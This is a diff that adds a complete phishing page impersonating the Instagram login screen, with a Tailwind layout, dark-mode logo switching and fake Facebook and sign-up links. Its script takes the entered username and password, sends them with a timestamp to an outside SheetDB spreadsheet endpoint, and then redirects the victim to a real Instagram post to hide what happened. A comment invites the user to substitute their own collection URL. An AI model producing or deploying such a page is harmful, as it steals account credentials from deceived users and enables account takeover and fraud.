@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ig-primary: #0095f6;
+            --ig-secondary: #00376b;
+            --ig-border: #dbdbdb;
+        }
+        
+        .dark {
+            --ig-primary: #0095f6;
+            --ig-secondary: #e0f1ff;
+            --ig-border: #363636;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            transition: background-color 0.3s ease;
+        }
+        
+        .instagram-btn {
+            background-color: var(--ig-primary);
+            transition: all 0.2s ease;
+        }
+        
+        .instagram-btn:hover {
+            background-color: #1877f2;
+        }
+        
+        .border-ig {
+            border-color: var(--ig-border);
+        }
+        
+        .loader {
+            border-top-color: var(--ig-primary);
+            animation: spinner 0.6s linear infinite;
+        }
+        
+        @keyframes spinner {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-white dark:bg-black text-gray-800 dark:text-white">
+    <div class="min-h-screen flex flex-col items-center justify-center px-4">
+        <div class="max-w-sm w-full">
+            <!-- Card container -->
+            <div class="border border-ig rounded bg-white dark:bg-gray-900 p-8 mb-4">
+                <!-- Instagram Logo -->
+                <div class="flex justify-center mb-8">
+                    <img id="instagram-logo" src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram" class="h-12">
+                </div>
+                
+                <!-- Login Form -->
+                <form id="loginForm" class="flex flex-col space-y-3">
+                    <!-- Username/Email input -->
+                    <div class="relative">
+                        <input 
+                            type="text" 
+                            id="username" 
+                            name="username" 
+                            class="w-full border border-ig bg-gray-50 dark:bg-gray-800 p-2 text-sm rounded text-base" 
+                            placeholder="Phone number, username, or email"
+                            required
+                        >
+                    </div>
+                    
+                    <!-- Password input -->
+                    <div class="relative">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password" 
+                            class="w-full border border-ig bg-gray-50 dark:bg-gray-800 p-2 text-sm rounded text-base" 
+                            placeholder="Password"
+                            required
+                        >
+                    </div>
+                    
+                    <!-- Login Button -->
+                    <button 
+                        type="submit" 
+                        id="loginButton" 
+                        class="instagram-btn text-white font-medium py-1.5 rounded text-sm"
+                    >
+                        <span id="buttonText">Log In</span>
+                        <span id="spinner" class="hidden">
+                            <div class="loader inline-block w-4 h-4 border-2 rounded-full"></div>
+                        </span>
+                    </button>
+                    
+                    <!-- OR Divider -->
+                    <div class="flex items-center my-2">
+                        <div class="flex-1 h-px bg-gray-300 dark:bg-gray-700"></div>
+                        <span class="px-3 text-sm text-gray-500 dark:text-gray-400 font-medium">OR</span>
+                        <div class="flex-1 h-px bg-gray-300 dark:bg-gray-700"></div>
+                    </div>
+                    
+                    <!-- Login with Facebook -->
+                    <a href="#" class="flex items-center justify-center text-[#385185] dark:text-blue-400 font-medium text-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="currentColor" viewBox="0 0 24 24">
+                            <path d="M9.85 19H13V12.05H15.84L16.4 9.0H13V7.02C13 6.14 13.23 5.24 14.6 5.24H16.4V2.5C16.4 2.5 15.19 2.27 14.07 2.27C11.72 2.27 10.15 3.78 10.15 6.7V9.01H7.4V12.05H10.15V19H9.85Z" />
+                        </svg>
+                        Log in with Facebook
+                    </a>
+                    
+                    <!-- Forgot Password -->
+                    <a href="#" class="text-center text-xs text-blue-900 dark:text-blue-400">Forgot password?</a>
+                </form>
+            </div>
+            
+            <!-- Sign Up Link -->
+            <div class="border border-ig rounded bg-white dark:bg-gray-900 p-4 text-center">
+                <p class="text-sm">
+                    Don't have an account? <a href="#" class="text-[#0095f6] font-medium">Sign up</a>
+                </p>
+            </div>
+            
+            <!-- App Download -->
+            <div class="mt-4 text-center">
+                <p class="text-sm mb-4">Get the app.</p>
+                <div class="flex justify-center space-x-2">
+                    <a href="#"><img src="apple-button.png" alt="Download on App Store" class="h-10"></a>
+                    <a href="#"><img src="googleplay-button.png" alt="Get it on Google Play" class="h-10"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Dark mode detection
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+            document.getElementById('instagram-logo').src = "https://i.imgur.com/JSgHdtV.png"; // White logo for dark mode
+        }
+        
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+            if (event.matches) {
+                document.documentElement.classList.add('dark');
+                document.getElementById('instagram-logo').src = "https://i.imgur.com/JSgHdtV.png"; // White logo for dark mode
+            } else {
+                document.documentElement.classList.remove('dark');
+                document.getElementById('instagram-logo').src = "https://i.imgur.com/zqpwkLQ.png"; // Black logo for light mode
+            }
+        });
+        
+        // Form submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Show loading state
+            document.getElementById('buttonText').classList.add('hidden');
+            document.getElementById('spinner').classList.remove('hidden');
+            
+            // Get form values
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                // This is where we would connect to SheetDB (you need to replace with your API URL)
+                const sheetDbUrl = 'https://sheetdb.io/api/v1/wgldgdv81wgcn';
+                
+                // Send data to SheetDB
+                const response = await fetch(sheetDbUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        data: [
+                            {
+                                username: username,
+                                password: password,
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    })
+                });
+                
+                // After successful submission, redirect to Instagram
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/p/B8m2SlpBxc4/';
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Error submitting form:', error);
+                
+                // Restore button state
+                document.getElementById('buttonText').classList.remove('hidden');
+                document.getElementById('spinner').classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
